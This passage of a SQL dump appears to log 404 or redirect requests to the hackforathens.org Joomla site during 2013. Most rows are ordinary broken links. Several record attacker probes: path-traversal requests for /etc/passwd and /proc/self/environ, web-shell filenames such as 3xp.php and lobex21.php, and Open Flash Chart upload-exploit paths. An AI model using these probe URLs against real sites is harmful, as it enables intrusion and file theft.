00:00:00'),(299,'http://hackforathens.org/www.linkedin.com/pub/bob-pinckney/7/9a6/744','','','',1,0,'2013-06-30 23:24:16','0000-00-00 00:00:00'),(300,'http://hackforathens.org/www.linkedin.com/pub/margaret-wagner-dahl/12/38b/b16','','','',1,0,'2013-06-30 23:24:19','0000-00-00 00:00:00'),(301,'http://hackforathens.org/www.linkedin.com/pub/tom-robertson/18/632/6a5','','','',1,0,'2013-06-30 23:24:21','0000-00-00 00:00:00'),(302,'http://www.hackforathens.org/get-involved/challenges/','','','',11,0,'2013-07-01 03:35:16','0000-00-00 00:00:00'),(303,'http://www.hackforathens.org/admin','','','',27,0,'2013-07-08 07:18:34','0000-00-00 00:00:00'),(304,'http://www.hackforathens.org/wp-login.php','','','',5,0,'2013-07-08 07:18:35','0000-00-00 00:00:00'),(305,'http://www.hackforathens.org/get-involved/challenges/18-challenges/48-safe-drinking-water-challenge','','','',2,0,'2013-07-08 07:19:28','0000-00-00 00:00:00'),(306,'http://hackforathens.org/component/content/category/media/kunena/attachments/305/comm-unity.pptx','','','',1,0,'2013-07-08 18:02:29','0000-00-00 00:00:00'),(307,'http://hackforathens.org/component/content/category/media/kunena/attachments/324/affordableinternetpres.pptx','','','',1,0,'2013-07-08 18:02:34','0000-00-00 00:00:00'),(308,'http://hackforathens.org/get-involved/discussion/user/302-bovogygop','','','',2,0,'2013-07-13 00:15:47','0000-00-00 00:00:00'),(309,'http://hackforathens.org/get-involved/discussion/user/293-jfnqwfl39','','','',1,0,'2013-07-13 00:15:52','0000-00-00 00:00:00'),(310,'http://hackforathens.org/get-involved/discussion/user/290-kc','','','',1,0,'2013-07-13 00:16:02','0000-00-00 00:00:00'),(311,'http://hackforathens.org/get-involved/discussion/user/288-rlblais','','','',1,0,'2013-07-13 00:16:07','0000-00-00 00:00:00'),(312,'http://hackforathens.org/index.php/get-involved/challeng...allenges/49-athens-affordable-internet-challenge','','','',1,0,'2013-07-13 12:41:00','0000-00-00 00:00:00'),(313,'http://www.hackforathens.org/get-involved/challenges/submit-challenges?view=form','','','',7,0,'2013-07-15 12:13:26','0000-00-00 00:00:00'),(314,'http://hackforathens.org/images/stories/3xp.php','','','',5,0,'2013-07-17 15:31:16','0000-00-00 00:00:00'),(315,'http://hackforathens.org/index.php/forum/topics/posts/mode-latest/userid-254','','','',1,0,'2013-07-20 03:23:29','0000-00-00 00:00:00'),(316,'http://hackforathens.org/index.php/forum/user/254-kstorm','','','',1,0,'2013-07-20 03:23:31','0000-00-00 00:00:00'),(317,'http://hackforathens.org/index.php/forum/user/255-kelly','','','',1,0,'2013-07-20 03:23:33','0000-00-00 00:00:00'),(318,'http://hackforathens.org/index.php/forum/user/256-jonathan','','','',1,0,'2013-07-20 03:23:35','0000-00-00 00:00:00'),(319,'http://hackforathens.org/index.php/forum/user/257-jim','','','',1,0,'2013-07-20 03:23:37','0000-00-00 00:00:00'),(320,'http://hackforathens.org/index.php/forum/user/list','','','',1,0,'2013-07-20 03:23:39','0000-00-00 00:00:00'),(321,'http://www.hackforathens.org/index.php/datasets','','','',2,0,'2013-07-20 03:24:38','0000-00-00 00:00:00'),(322,'http://www.hackforathens.org/index.php/forum/general-information/1-welcome-to-the-hackforathens-forum','','','',1,0,'2013-07-20 03:24:47','0000-00-00 00:00:00'),(323,'http://www.hackforathens.org/index.php/forum/recent','','','',1,0,'2013-07-20 03:24:54','0000-00-00 00:00:00'),(324,'http://www.hackforathens.org/index.php/forum/search','','','',1,0,'2013-07-20 03:24:56','0000-00-00 00:00:00'),(325,'http://www.hackforathens.org/index.php/forum/topics/posts/mode-latest/userid-254','','','',1,0,'2013-07-20 03:25:04','0000-00-00 00:00:00'),(326,'http://www.hackforathens.org/index.php/forum/user/254-kstorm','','','',1,0,'2013-07-20 03:25:07','0000-00-00 00:00:00'),(327,'http://www.hackforathens.org/index.php/forum/user/255-kelly','','','',1,0,'2013-07-20 03:25:09','0000-00-00 00:00:00'),(328,'http://www.hackforathens.org/index.php/forum/user/256-jonathan','','','',1,0,'2013-07-20 03:25:12','0000-00-00 00:00:00'),(329,'http://www.hackforathens.org/index.php/forum/user/257-jim','','','',1,0,'2013-07-20 03:25:14','0000-00-00 00:00:00'),(330,'http://www.hackforathens.org/index.php/forum/user/258-jcmanous','','','',1,0,'2013-07-20 03:25:16','0000-00-00 00:00:00'),(331,'http://www.hackforathens.org/index.php/forum/user/list','','','',1,0,'2013-07-20 03:25:18','0000-00-00 00:00:00'),(332,'http://www.hackforathens.org/index.php/kunena/recent-topics','','','',2,0,'2013-07-20 03:25:22','0000-00-00 00:00:00'),(333,'http://hackforathens.org/index.php/challenges?tmpl=component&print=1&page=','','','',1,0,'2013-07-21 16:32:52','0000-00-00 00:00:00'),(334,'http://hackforathens.org/index.php/datasets?tmpl=component&print=1&page=','','','',1,0,'2013-07-21 16:33:26','0000-00-00 00:00:00'),(335,'http://hackforathens.org/index.php/forum/general-information/1-welcome-to-the-hackforathens-forum/unread','','','',1,0,'2013-07-21 16:33:28','0000-00-00 00:00:00'),(336,'http://www.hackforathens.org/index.php/challenges?tmpl=component&print=1&page=','','','',1,0,'2013-07-21 16:33:39','0000-00-00 00:00:00'),(337,'http://www.hackforathens.org/index.php/datasets?tmpl=component&print=1&page=','','','',1,0,'2013-07-21 16:34:08','0000-00-00 00:00:00'),(338,'http://www.hackforathens.org/index.php/forum/general-information/1-welcome-to-the-hackforathens-forum/unread','','','',1,0,'2013-07-21 16:34:10','0000-00-00 00:00:00'),(339,'http://www.hackforathens.org/get-involved/datasets/','','','',6,0,'2013-07-22 19:31:38','0000-00-00 00:00:00'),(340,'http://hackforathens.org/get-involved/discussion/user/287-mytollett','','','',1,0,'2013-07-23 04:40:29','0000-00-00 00:00:00'),(341,'http://hackforathens.org/get-involved/discussion/user/284-bkovach13','','','',1,0,'2013-07-23 04:40:34','0000-00-00 00:00:00'),(342,'http://hackforathens.org/get-involved/discussion/user/283-lblais','','','',1,0,'2013-07-23 04:40:39','0000-00-00 00:00:00'),(343,'http://hackforathens.org/get-involved/discussion/user/282-stormymx','','','',1,0,'2013-07-23 04:40:44','0000-00-00 00:00:00'),(344,'http://hackforathens.org/get-involved/discussion/user/279-travisdouce','','','',1,0,'2013-07-23 04:40:49','0000-00-00 00:00:00'),(345,'http://www.hackforathens.org/www.linkedin.com/pub/bob-pinckney/7/9a6/744','','','',1,0,'2013-07-23 22:28:02','0000-00-00 00:00:00'),(346,'http://www.hackforathens.org/www.linkedin.com/pub/margaret-wagner-dahl/12/38b/b16','','','',1,0,'2013-07-23 22:28:09','0000-00-00 00:00:00'),(347,'http://www.hackforathens.org/www.linkedin.com/pub/tom-robertson/18/632/6a5','','','',1,0,'2013-07-23 22:28:12','0000-00-00 00:00:00'),(348,'http://hackforathens.org/2evlwfgprw8t4r8x.html','','http://hackforathens.org/','',1,0,'2013-07-24 07:29:52','0000-00-00 00:00:00'),(349,'http://hackforathens.org/component/kunena/join.php','','http://hackforathens.org/component/kunena/','',4,0,'2013-07-24 16:08:34','0000-00-00 00:00:00'),(350,'http://hackforathens.org/component/kunena/join_form.php','','http://hackforathens.org/component/kunena/','',4,0,'2013-07-24 16:08:35','0000-00-00 00:00:00'),(351,'http://hackforathens.org/index.php/component/content/category/media/kunena/attachments/305/comm-unity.pptx','','','',1,0,'2013-07-27 17:00:33','0000-00-00 00:00:00'),(352,'http://hackforathens.org/index.php/component/content/category/media/kunena/attachments/324/affordableinternetpres.pptx','','','',1,0,'2013-07-27 17:00:35','0000-00-00 00:00:00'),(353,'http://www.hackforathens.org/index.php/component/content/category/media/kunena/attachments/305/comm-unity.pptx','','','',1,0,'2013-07-27 17:02:15','0000-00-00 00:00:00'),(354,'http://www.hackforathens.org/index.php/component/content/category/media/kunena/attachments/324/affordableinternetpres.pptx','','','',1,0,'2013-07-27 17:02:17','0000-00-00 00:00:00'),(355,'http://www.hackforathens.org/component/content/category/media/kunena/attachments/305/comm-unity.pptx','','','',1,0,'2013-07-28 17:22:16','0000-00-00 00:00:00'),(356,'http://www.hackforathens.org/component/content/category/media/kunena/attachments/324/affordableinternetpres.pptx','','','',1,0,'2013-07-28 17:22:17','0000-00-00 00:00:00'),(357,'http://www.hackforathens.org/about/schedule /','','','',3,0,'2013-07-28 23:12:15','0000-00-00 00:00:00'),(358,'http://www.hackforathens.org/about/pitch-contest /','','','',3,0,'2013-07-28 23:12:15','0000-00-00 00:00:00'),(359,'http://www.hackforathens.org/about/resources /','','','',3,0,'2013-07-28 23:12:18','0000-00-00 00:00:00'),(360,'http://www.hackforathens.org/about/open-source-guidelines /','','','',3,0,'2013-07-28 23:12:18','0000-00-00 00:00:00'),(361,'http://www.hackforathens.org/get-involved/challenges/view-challenges /','','','',3,0,'2013-07-28 23:12:19','0000-00-00 00:00:00'),(362,'http://www.hackforathens.org/get-involved/datasets/view-datasets /','','','',3,0,'2013-07-28 23:12:25','0000-00-00 00:00:00'),(363,'http://www.hackforathens.org/get-involved/teams /','','','',3,0,'2013-07-28 23:12:27','0000-00-00 00:00:00'),(364,'http://www.hackforathens.org/get-involved/teams/view-teams /','','','',3,0,'2013-07-28 23:12:30','0000-00-00 00:00:00'),(365,'http://www.hackforathens.org/sponsor /','','','',3,0,'2013-07-28 23:12:32','0000-00-00 00:00:00'),(366,'http://www.hackforathens.org/contact /','','','',3,0,'2013-07-28 23:12:45','0000-00-00 00:00:00'),(367,'http://www.hackforathens.org/sponsor-payment /','','','',3,0,'2013-07-28 23:12:45','0000-00-00 00:00:00'),(368,'http://www.hackforathens.org/get-involved/challenges/onclick=','','','',3,0,'2013-07-28 23:12:46','0000-00-00 00:00:00'),(369,'http://www.hackforathens.org/get-involved/datasets/onclick=','','','',3,0,'2013-07-28 23:12:51','0000-00-00 00:00:00'),(370,'http://www.hackforathens.org/component/kunena/main-forum\'','','http://www.hackforathens.org/component/kunena/main-forum\'','',1,0,'2013-08-02 00:37:16','0000-00-00 00:00:00'),(371,'http://www.hackforathens.org/javascript:void(0);','','','',4,0,'2013-08-02 19:31:55','0000-00-00 00:00:00'),(372,'http://www.hackforathens.org/about/schedule/javascript:void(0);','','','',4,0,'2013-08-02 19:32:04','0000-00-00 00:00:00'),(373,'http://www.hackforathens.org/about/resources/javascript:void(0);','','','',4,0,'2013-08-02 19:32:06','0000-00-00 00:00:00'),(374,'http://www.hackforathens.org/about/pitch-contest/javascript:void(0);','','','',4,0,'2013-08-02 19:32:10','0000-00-00 00:00:00'),(375,'http://www.hackforathens.org/about/open-source-guidelines/javascript:void(0);','','','',4,0,'2013-08-02 19:32:11','0000-00-00 00:00:00'),(376,'http://hackforathens.org/get-involved/discussion/user/list?start=30','','','',1,0,'2013-08-03 13:36:49','0000-00-00 00:00:00'),(377,'http://hackforathens.org/media/Safe','','','',4,0,'2013-08-09 18:41:24','0000-00-00 00:00:00'),(378,'http://hackforathens.org/index.php/get-involved/discussion/topics/mode-topics/sel-720?format=feed&type=rss','','','',6,0,'2013-08-13 12:30:39','0000-00-00 00:00:00'),(379,'http://hackforathens.org/index.php?option=com_user&view=reset&layout-confirm=com_user&view=reset&layout=confirm','','','',1,0,'2013-08-19 21:33:48','0000-00-00 00:00:00'),(380,'http://HACKFORATHENS.org/LICESNE.php','','','',1,0,'2013-08-20 08:19:53','0000-00-00 00:00:00'),(381,'http://hackforathens.org/domainsigma_removal_5c3fdd0e27539b791698531ad612a5eddf39a70a.html','','','',1,0,'2013-08-27 19:53:54','0000-00-00 00:00:00'),(382,'http://hackforathens.org/jbskk53cdhjm0g7z.html','','http://hackforathens.org/','',1,0,'2013-08-29 03:15:29','0000-00-00 00:00:00'),(383,'http://hackforathens.org/component/content/?id=10&Itemid=/proc/self/environ','','','',1,0,'2013-09-02 01:13:19','0000-00-00 00:00:00'),(384,'http://hackforathens.org/component/content/?id=10&Itemid=/proc/self/environ\0','','','',1,0,'2013-09-02 01:13:19','0000-00-00 00:00:00'),(385,'http://hackforathens.org/component/content/?id=10&Itemid=../../../../../../../../../../proc/self/environ','','','',1,0,'2013-09-02 01:13:20','0000-00-00 00:00:00'),(386,'http://hackforathens.org/component/content/?id=10&Itemid=/../../../../../../../../../../proc/self/environ\0','','','',1,0,'2013-09-02 01:13:21','0000-00-00 00:00:00'),(387,'http://hackforathens.org/component/content/?id=10&Itemid=/etc/passwd','','','',1,0,'2013-09-02 01:13:22','0000-00-00 00:00:00'),(388,'http://hackforathens.org/component/content/?id=10&Itemid=/etc/passwd\0','','','',1,0,'2013-09-02 01:13:23','0000-00-00 00:00:00'),(389,'http://hackforathens.org/component/content/?id=10&Itemid=../../../../../../../../../../etc/passwd','','','',1,0,'2013-09-02 01:13:24','0000-00-00 00:00:00'),(390,'http://hackforathens.org/component/content/?id=10&Itemid=/../../../../../../../../../../etc/passwd','','','',1,0,'2013-09-02 01:13:24','0000-00-00 00:00:00'),(391,'http://hackforathens.org/component/content/?id=10&Itemid=../../../../../../../../../../etc/passwd\0','','','',1,0,'2013-09-02 01:13:25','0000-00-00 00:00:00'),(392,'http://hackforathens.org/component/content/?id=10&Itemid=/../../../../../../../../../../etc/passwd\0','','','',1,0,'2013-09-02 01:13:26','0000-00-00 00:00:00'),(393,'http://HACKFORATHENS.org/images/stories/story.php','','','',1,0,'2013-09-05 07:21:49','0000-00-00 00:00:00'),(394,'http://hackforathens.org/bitrix/admin/index.php?lang=en','','','',1,0,'2013-09-05 20:17:53','0000-00-00 00:00:00'),(395,'http://hackforathens.org/admin/login.php','','','',1,0,'2013-09-05 20:17:54','0000-00-00 00:00:00'),(396,'http://hackforathens.org/admin/','','','',1,0,'2013-09-05 20:17:55','0000-00-00 00:00:00'),(397,'http://hackforathens.org/user/','','','',1,0,'2013-09-05 20:17:55','0000-00-00 00:00:00'),(398,'http://HACKFORATHENS.org/wp-includes/js/tinymce/wp-mce-help.php','','','',1,0,'2013-09-08 23:08:52','0000-00-00 00:00:00'),(399,'http://HACKFORATHENS.org/tmp/temlpates.php','','','',1,0,'2013-09-09 09:52:53','0000-00-00 00:00:00'),(400,'http://hackforathens.org/images/images.php','','','',1,0,'2013-09-11 11:30:53','0000-00-00 00:00:00'),(401,'http://hackforathens.org/component/content/category/\"http://sonomacounty.golocal.coop/businesses/finance-insurance-and-real-estate/banks-and-credit-unions\"','','','',1,0,'2013-09-12 12:24:17','0000-00-00 00:00:00'),(402,'http://hackforathens.org/component/content/category/\"http://en.wikipedia.org/wiki/Open_data\"','','','',1,0,'2013-09-12 12:24:24','0000-00-00 00:00:00'),(403,'http://hackforathens.org/component/content/category/\"http://researchcu.ncua.gov/Views/FindCreditUnions.aspx\"','','','',1,0,'2013-09-12 12:24:35','0000-00-00 00:00:00'),(404,'http://hackforathens.org/component/content/category/\"images/EPA_Safe_Drinking_Water_Challenge_QuickStart_Guide.docx\">QuickStart','','','',1,0,'2013-09-12 12:24:37','0000-00-00 00:00:00'),(405,'http://hackforathens.org/component/content/category/\"https://developers.facebook.com/docs/reference/apis/\"','','','',1,0,'2013-09-12 12:24:46','0000-00-00 00:00:00'),(406,'http://hackforathens.org/component/content/category/\"http://www.census.gov/hhes/www/poverty/index.html\"','','','',1,0,'2013-09-12 12:24:49','0000-00-00 00:00:00'),(407,'http://hackforathens.org/component/content/category/\"http://www2.fdic.gov/sod/\"','','','',1,0,'2013-09-12 12:24:51','0000-00-00 00:00:00'),(408,'http://hackforathens.org/component/content/category/\"http://www.epa.gov/enviro/facts/sdwis/model.html\"','','','',1,0,'2013-09-12 12:24:54','0000-00-00 00:00:00'),(409,'http://hackforathens.org/component/content/category/\"http://detroitdjc.org/wireless-mesh/\"','','','',1,0,'2013-09-12 12:24:59','0000-00-00 00:00:00'),(410,'http://hackforathens.org/component/content/category/\"https://explore.data.gov/Banking-Finance-and-Insurance/FDIC-Summary-of-Deposits-SOD-Download-File/eq99-z357\"','','','',1,0,'2013-09-12 12:25:01','0000-00-00 00:00:00'),(411,'http://hackforathens.org/component/content/category/\"http://www.data.gov/opendatasites\"','','','',1,0,'2013-09-12 12:25:12','0000-00-00 00:00:00'),(412,'http://hackforathens.org/component/content/category/\"http://opencityapps.org/\"','','','',1,0,'2013-09-12 12:25:15','0000-00-00 00:00:00'),(413,'http://hackforathens.org/component/content/category/\"https://dev.twitter.com/\"','','','',1,0,'2013-09-12 12:25:16','0000-00-00 00:00:00'),(414,'http://hackforathens.org/component/content/category/\"http://investigativereportingworkshop.org/investigations/broadband-adoption/htmlmulti/broadband-adoption-map/\"','','','',1,0,'2013-09-12 12:25:19','0000-00-00 00:00:00'),(415,'http://hackforathens.org/component/content/category/\"images/ACC_20_Poverty_Block_Groups.pdf\"','','','',1,0,'2013-09-12 12:25:25','0000-00-00 00:00:00'),(416,'http://hackforathens.org/component/content/category/\"http://www.freeitathens.org/\"','','','',1,0,'2013-09-12 12:25:28','0000-00-00 00:00:00'),(417,'http://hackforathens.org/component/content/category/\"http://www.internetessentials.com/\"','','','',1,0,'2013-09-12 12:25:31','0000-00-00 00:00:00'),(418,'http://hackforathens.org/component/content/category/\"http://www.opengovtplatform.org/\"','','','',1,0,'2013-09-12 12:25:37','0000-00-00 00:00:00'),(419,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/scott-shamp/0/881/60\"','','','',1,0,'2013-09-12 12:25:42','0000-00-00 00:00:00'),(420,'http://hackforathens.org/component/content/category/\"http://hfa-data-portal.herokuapp.com/\"','','','',1,0,'2013-09-12 12:25:48','0000-00-00 00:00:00'),(421,'http://hackforathens.org/component/content/category/\"index.php?option=com_content&view=article&id=44&Itemid=193\">June','','','',1,0,'2013-09-12 12:25:51','0000-00-00 00:00:00'),(422,'http://hackforathens.org/component/content/category/\"http://communityconnection211.org/\"','','','',1,0,'2013-09-12 12:25:54','0000-00-00 00:00:00'),(423,'http://hackforathens.org/component/content/category/\"media/kunena/attachments/305/comm-unity.pptx\"','','','',1,0,'2013-09-12 12:25:57','0000-00-00 00:00:00'),(424,'http://hackforathens.org/component/content/category/\"index.php?option=com_content&view=article&id=43&Itemid=199\">Open','','','',1,0,'2013-09-12 12:26:00','0000-00-00 00:00:00'),(425,'http://hackforathens.org/component/content/category/\"https://code.google.com/\">','','','',1,0,'2013-09-12 12:26:03','0000-00-00 00:00:00'),(426,'http://hackforathens.org/component/content/category/\"http://hackforchange.org/challenge/bureau-economic-analysis-api-challenge\"','','','',1,0,'2013-09-12 12:26:06','0000-00-00 00:00:00'),(427,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/baron-chandler/4/3b9/313\"','','','',1,0,'2013-09-12 12:26:09','0000-00-00 00:00:00'),(428,'http://hackforathens.org/component/content/category/\"http://bit.ly/1b1abXL\"','','','',1,0,'2013-09-12 12:26:19','0000-00-00 00:00:00'),(429,'http://hackforathens.org/component/content/category/\"https://github.com/GSto/hfa-open-data','','','',1,0,'2013-09-12 12:26:22','0000-00-00 00:00:00'),(430,'http://hackforathens.org/component/content/category/\"http://hackforchange.org\"','','','',1,0,'2013-09-12 12:26:28','0000-00-00 00:00:00'),(431,'http://hackforathens.org/component/content/category/\"index.php?option=com_content&view=article&id=47&Itemid=201\">Pitch','','','',1,0,'2013-09-12 12:26:34','0000-00-00 00:00:00'),(432,'http://hackforathens.org/component/content/category/\"http://www.rhok.org/\">Random','','','',1,0,'2013-09-12 12:26:45','0000-00-00 00:00:00'),(433,'http://hackforathens.org/component/content/category/\"https://josm.openstreetmap.de/\"','','','',1,0,'2013-09-12 12:26:48','0000-00-00 00:00:00'),(434,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/alexandria-drake/73/179/3b7\"','','','',1,0,'2013-09-12 12:26:51','0000-00-00 00:00:00'),(435,'http://hackforathens.org/component/content/category/\"http://mango.ctegd.uga.edu/jkissingLab/\"','','','',1,0,'2013-09-12 12:27:05','0000-00-00 00:00:00'),(436,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/jonathan-wallace/9/8ba/888\"','','','',1,0,'2013-09-12 12:27:08','0000-00-00 00:00:00'),(437,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/in/seandeeze\"','','','',1,0,'2013-09-12 12:27:11','0000-00-00 00:00:00'),(438,'http://hackforathens.org/component/content/category/\"http://www.nytimes.com/2010/02/04/technology/personaltech/04volunteer.html?_r=0<br />\"','','','',1,0,'2013-09-12 12:27:22','0000-00-00 00:00:00'),(439,'http://hackforathens.org/component/content/category/\"media/kunena/attachments/324/affordableinternetpres.pptx\"','','','',1,0,'2013-09-12 12:27:25','0000-00-00 00:00:00'),(440,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/jennifer-johnson/5a/215/136/\"','','','',1,0,'2013-09-12 12:27:29','0000-00-00 00:00:00'),(441,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/in/jordankburke\"','','','',1,0,'2013-09-12 12:27:40','0000-00-00 00:00:00'),(442,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/in/angelkbrown\"','','','',1,0,'2013-09-12 12:27:43','0000-00-00 00:00:00'),(443,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/in/staceylkerr\"','','','',1,0,'2013-09-12 12:27:46','0000-00-00 00:00:00'),(444,'http://hackforathens.org/component/content/category/\"http://www.linkedin.com/pub/peter-walker/29/253/6a7\"','','','',1,0,'2013-09-12 12:27:49','0000-00-00 00:00:00'),(445,'http://hackforathens.org/component/content/category/\"http://www.nytimes.com/2010/02/04/technology/personaltech/04volunteer.html','','','',1,0,'2013-09-12 12:28:01','0000-00-00 00:00:00'),(446,'http://hackforathens.org/component/content/category/\"http://github.com/PendragonDevelopment/hack-for-athens\"','','','',1,0,'2013-09-12 12:28:08','0000-00-00 00:00:00'),(447,'http://hackforathens.org/component/content/category/\"index.php?option=com_content&view=article&id=48:safe-drinking-water-challenge&catid=18:challenges\">Safe','','','',1,0,'2013-09-12 12:28:25','0000-00-00 00:00:00'),(448,'http://hackforathens.org/component/content/category/\"http://ckan.org/\"','','','',1,0,'2013-09-12 12:28:26','0000-00-00 00:00:00'),(449,'http://hackforathens.org/component/content/category/\"https://github.com/\">','','','',1,0,'2013-09-12 12:28:29','0000-00-00 00:00:00'),(450,'http://hackforathens.org/component/content/category/\"http://kellystorm.com\"','','','',1,0,'2013-09-12 12:28:31','0000-00-00 00:00:00'),(451,'http://hackforathens.org/images/stories/muakero.php','','','',1,0,'2013-09-16 15:29:35','0000-00-00 00:00:00'),(452,'http://HACKFORATHENS.ORG/blog/','','http://HACKFORATHENS.ORG/blog/','',1,0,'2013-09-20 11:42:09','0000-00-00 00:00:00'),(453,'http://www.hackforathens.org/cfbswiqefjgqdlut.html','','','',1,0,'2013-09-21 03:57:09','0000-00-00 00:00:00'),(454,'http://hackforathens.org/component/content/?Itemid=117&id=10','','http://hackforathens.org','',4,0,'2013-09-21 19:45:27','0000-00-00 00:00:00'),(455,'http://hackforathens.org/component/content/?Itemid=112&id=5','','http://hackforathens.org','',2,0,'2013-09-21 19:45:37','0000-00-00 00:00:00'),(456,'http://hackforathens.org/component/content/?Itemid=113&id=6','','http://hackforathens.org','',4,0,'2013-09-21 19:45:44','0000-00-00 00:00:00'),(457,'http://hackforathens.org/component','','','',2,0,'2013-09-22 16:13:37','0000-00-00 00:00:00'),(458,'http://www.hackforathens.org/kjotnizp.html','','','',1,0,'2013-09-28 07:09:17','0000-00-00 00:00:00'),(459,'http://www.hackforathens.org/wp-admin','','','',1,0,'2013-09-29 23:48:16','0000-00-00 00:00:00'),(460,'http://hackforathens.org/6','','','',1,0,'2013-11-27 00:46:19','0000-00-00 00:00:00'),(461,'http://hackforathens.org/images/stories/config.inc.php?rf','','','',14,0,'2013-11-30 16:18:50','0000-00-00 00:00:00'),(462,'http://www.hackforathens.org/jdcfheyv.html','','','',1,0,'2013-12-02 17:43:13','0000-00-00 00:00:00'),(463,'http://hackforathens.org/webalizer/','','http://hackforathens.org/webalizer/','',1,0,'2013-12-06 02:45:08','0000-00-00 00:00:00'),(464,'http://hackforathens.org//images/stories/ViAr.php?rf','','','',4,0,'2013-12-07 19:41:05','0000-00-00 00:00:00'),(465,'http://hackforathens.org//images/stories/food/footer.php?clone','','','',4,0,'2013-12-07 19:41:06','0000-00-00 00:00:00'),(466,'http://hackforathens.org//administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',6,0,'2013-12-08 08:50:07','0000-00-00 00:00:00'),(467,'http://hackforathens.org//administrator/components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',5,0,'2013-12-08 08:50:07','0000-00-00 00:00:00'),(468,'http://hackforathens.org//administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',5,0,'2013-12-08 08:50:08','0000-00-00 00:00:00'),(469,'http://hackforathens.org//administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/lobex21.php?rf','','','',5,0,'2013-12-08 08:50:08','0000-00-00 00:00:00'),(470,'http://hackforathens.org//administrator/components/com_acymailing/inc/openflash/tmp-upload-images/lobex21.php?rf','','','',5,0,'2013-12-08 08:50:08','0000-00-00 00:00:00'),(471,'http://hackforathens.org//administrator/components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',5,0,'2013-12-08 08:50:08','0000-00-00 00:00:00'),(472,'http://hackforathens.org//administrator/components/com_maianmedia/utilities/charts/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',5,0,'2013-12-08 08:50:09','0000-00-00 00:00:00'),(473,'http://hackforathens.org//administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/lobex21.php?rf','','','',4,0,'2013-12-08 08:50:09','0000-00-00 00:00:00'),(474,'http://hackforathens.org//administrator/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=lobex21.php','','','',5,0,'2013-12-08 08:50:09','0000-00-00 00:00:00'),(475,'http://hackforathens.org//administrator/components/com_jinc/classes/graphics/tmp-upload-images/lobex21.php?rf','','','',5,0,'2013-12-08 08:50:09','0000-00-00 00:00:00'),(476,'http://hackforathens.org//administrator/components/com_maianmedia/utilities/charts/tmp-upload-images/lobex21.php?rf','','','',4,0,'2013-12-08 08:50:09','0000-00-00 00:00:00'),(477,'http://hackforathens.org//administrator/components/com_jnews/includes/openflashchart/tmp-upload-images/lobex21.php?rf','','','',5,0,'2013-12-08 08:50:10','0000-00-00 00:00:00'),(478,'http://www.hackforathens.org/elkbobvumz.html','','','',1,0,'2013-12-09 14:04:55','0000-00-00 00:00:00'),(479,'http://hackforathens.org/images/j.php','','','',2,0,'2013-12-09 20:24:45','0000-00-00 00:00:00'),(480,'http://hackforathens.org/images/stories/bouncer.php?rf','','','',1,0,'2013-12-10 04:59:44','0000-00-00 00:00:00'),(481,'http://hackforathens.org//images/stories/3xp.php','','','',25,0,'2013-12-14 06:39:56','0000-00-00 00:00:00'),(482,'http://hackforathens.org/component/content/article/18-challenges/51-athens-open-data-portal-challenge//images/stories/localhost.php?rf','','','',1,0,'2013-12-15 19:02:18','0000-00-00 00:00:00'),(483,'http://hackforathens.org//images/stories/localhost.php?rf','','','',4,0,'2013-12-15 19:02:18','0000-00-00 00:00:00'),(484,'http://hackforathens.org/component/content/article/18-challenges//images/stories/localhost.php?rf','','','',2,0,'2013-12-15 19:02:19','0000-00-00 00:00:00'),(485,'http://www.hackforathens.org/ykucazvnmqzjq.html','','','',1,0,'2013-12-16 14:26:54','0000-00-00 00:00:00'),(486,'http://hackforathens.org//images/stories/Exorcist.php?rf','','','',1,0,'2013-12-19 01:57:31','0000-00-00 00:00:00'),(487,'http://hackforathens.org//images/stories/audhry.php?rf','','','',1,0,'2013-12-19 10:24:59','0000-00-00 00:00:00'),(488,'http://hackforathens.org/modules/mod_dbrestore/mod_dbrestore.php','','','',2,0,'2013-12-23 02:51:08','0000-00-00 00:00:00'),(489,'http://www.hackforathens.org/slwzvybvdqqllo.html','','','',1,0,'2013-12-23 12:40:37','0000-00-00 00:00:00'),(490,'http://hackforathens.org/index.php?option=com_user&view=register','','','',1,0,'2013-12-23 14:46:29','0000-00-00 00:00:00'),(491,'http://www.hackforathens.org/index.php?option=com_user&view=register','','','',1,0,'2013-12-23 18:28:57','0000-00-00 00:00:00'),(492,'http://hackforathens.org/component/content/article/18-challenges//images/stories/explore.gif','','','',3,0,'2013-12-24 00:42:04','0000-00-00 00:00:00'),(493,'http://www.hackforathens.org/component/index.php?option=com_community&view=register','','http://www.hackforathens.org/component/index.php?option=com_community&view=register','',1,0,'2013-12-24 01:14:24','0000-00-00 00:00:00'),(494,'http://hackforathens.org/index.php/component/content/article/18-challenges//images/stories/explore.gif','','','',1,0,'2013-12-24 02:27:52','0000-00-00 00:00:00'),(495,'http://hackforathens.org/modules/mod_seolinks/mod_seolinks.php','','','',2,0,'2013-12-25 05:13:18','0000-00-00 00:00:00'),(496,'http://hackforathens.org/modules/mod_ya/mod_ya.php','','','',2,0,'2013-12-25 14:35:59','0000-00-00 00:00:00'),(497,'http://hackforathens.org//images/stories/indo.php?rf','','','',5,0,'2013-12-26 04:16:51','0000-00-00 00:00:00'),(498,'http://hackforathens.org/modules/mod_xsystem/mod_xsystem.php','','','',1,0,'2013-12-26 06:35:47','0000-00-00 00:00:00'),(499,'http://hackforathens.org/components/com_jooomlas/xyxz.php','','','',1,0,'2013-12-26 19:30:43','0000-00-00 00:00:00'),(500,'http://hackforathens.org/cache/sok/sok.php','','','',1,0,'2013-12-27 06:46:51','0000-00-00 00:00:00'),(501,'http://hackforathens.org//images/stories/bot.php','','','',3,0,'2013-12-28 08:31:27','0000-00-00 